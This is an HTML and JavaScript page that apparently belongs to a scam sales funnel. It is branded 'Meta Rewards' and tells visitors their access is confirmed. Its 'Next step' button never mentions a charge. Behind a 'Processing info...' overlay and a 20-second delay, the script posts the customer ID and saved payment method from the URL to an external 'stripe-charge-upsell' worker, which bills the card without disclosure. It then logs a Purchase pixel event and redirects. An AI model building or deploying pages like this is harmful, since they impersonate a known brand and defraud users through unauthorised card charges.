<body>
  <div class="card">
    <img class="logo" src="https://i.imgur.com/DtmTv8h.png" alt="Meta Rewards" />
    <div class="badge"><span>Step 2 of 3 — don't close</span></div>
    <h1>Congratulations!</h1>
    <p class="body">Your access has been confirmed.<br />Click below to continue accessing the program:</p>
    <div class="arrow-wrap">
      <div class="arrow"><svg viewBox="0 0 24 24"><polyline points="6 9 12 15 18 9"></polyline></svg></div>
    </div>
    <button id="btn-upsell-accept" type="button">Next step</button>
    <p class="faint">Secure connection · Meta Rewards</p>
  </div>
  <p class="faint">© <span id="yr"></span> All rights reserved.</p>

  <div id="overlay"><div class="spinner"></div><p>Processing info...</p></div>

<script>
  document.getElementById('yr').textContent = new Date().getFullYear();

  var UPSELL_NUMBER = 2;
  var WORKER_URL = 'https://metapay-v2.vinicio-bdf.workers.dev/api/stripe-charge-upsell';
  var FALLBACK_NEXT_URL = 'https://spot-pay.vita-protocol.online/obrigado';
  var UPSELL_DELAY_MS = 20000;

  var urlParams = new URLSearchParams(window.location.search);
  var cid = urlParams.get('cid');
  var pm = urlParams.get('pm');
  var email = urlParams.get('email') || '';
  var overlay = document.getElementById('overlay');
  var btn = document.getElementById('btn-upsell-accept');

  function go(overrideUrl) {
    var target = overrideUrl || FALLBACK_NEXT_URL;
    var targetUrl = new URL(target, window.location.origin);
    urlParams.forEach(function (v, k) { targetUrl.searchParams.set(k, v); });
    window.location.href = targetUrl.toString();
  }

  function chargeUpsell(email, onOk, onErr) {
    if (!cid || !pm) { onErr('Warning: payment information not found in URL.'); return; }
    setTimeout(function () {
      fetch(WORKER_URL + window.location.search, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          customer_id: cid,
          payment_method_id: pm,
          upsell_number: UPSELL_NUMBER,
          email: email,
          extra_params: Object.fromEntries(urlParams.entries())
        })
      })
        .then(function (r) { return r.json(); })
        .then(function (data) {
          if (data && data.ok) {
            if (data.status === 'succeeded' && data.amount > 0 && typeof fbq !== 'undefined') {
              fbq('track', 'Purchase', { value: data.amount / 100, currency: 'USD' });
            }
            onOk(data.next_url);
          } else {
            onErr((data && data.error) || 'Payment declined. Please try again.');
          }
        })
        .catch(function () { onErr('Connection failed. Check your internet and try again.'); });
    }, UPSELL_DELAY_MS);
  }

  btn.addEventListener('click', function (e) {
    e.preventDefault();
    btn.disabled = true;
    btn.textContent = 'Processing...';
    overlay.classList.add('show');

    var done = false;
    chargeUpsell(
      email,
      function (nextUrl) { if (done) return; done = true; go(nextUrl); },
      function (msg) {
        if (done) return;
        done = true;
        overlay.classList.remove('show');
        btn.disabled = false;
        btn.textContent = 'Next step';
        alert(msg);
      }
    );
  });
</script>
